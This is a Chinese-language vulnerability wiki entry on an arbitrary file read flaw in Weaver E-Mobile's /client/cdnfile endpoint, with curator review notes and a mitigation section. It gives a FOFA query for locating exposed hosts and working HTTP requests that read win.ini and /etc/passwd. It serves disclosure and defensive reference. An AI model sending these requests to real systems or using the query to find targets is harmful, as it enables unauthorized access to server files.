---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "泛微e-mobile client/cdnfile任意文件读取"
product: "泛微e-mobile"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；Windows与Linux路径模式不同"
prerequisites: "无cookie样本，实际前提不明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Mobile%20clientcdnfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-EMobile\""
id: "vw-131ff3104db84402ce1eca5c"
entity_id: "ve-131ff3104db84402ce1eca5c"
schema_version: "1"
---

# 泛微e-mobile client/cdnfile任意文件读取

## 条目说明

- 对象与具体问题：泛微e-mobile；client/cdnfile任意文件读取
- 版本、配置及部署条件：未给版本；Windows与Linux路径模式不同
- 认证与权限前提：无cookie样本，实际前提不明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 漏洞描述只写产品介绍，缺任意文件读取成因/路径解析说明
- 两平台样本应保留，但1C/C段和?windows/?linux用途未解释
- HTTP无围栏，结果仅截图，修复和在野利用无具体来源

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

泛微E-Mobile是一款由泛微网络科技股份有限公司开发的移动办公产品，该产品专门为手机、平板电脑等移动终端用户设计，旨在提供便捷、高效的移动办公体验。适用于企业高管和有移动办公需求的业务部相关员工使用，特别适合于已有内部OA系统的大中型企业机构，尤其是企业或部门有较多的分支机构。

## 影响版本

泛微E-Mobile

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="泛微-EMobile"

POC/EXP：windows

```http
GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```


![image-20240919100208079](./.resource/泛微E-Mobileclientcdnfile任意文件读取漏洞/media/image-20240919100208079.png)


POC/EXP：linux

```http
GET /client/cdnfile/C/etc/passwd?linux HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```


![image-20240919100254267](./.resource/泛微E-Mobileclientcdnfile任意文件读取漏洞/media/image-20240919100254267.png)


## 修复方案

**临时缓解方案**

接口设置访问权限或限制访问来源地址，如非必要，不要将系统开放在互联网上。

**升级修复方案**

目前官方已发布安全补丁，建议受影响用户尽快升级至安全版本

https://www.weaver.com.cn/


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
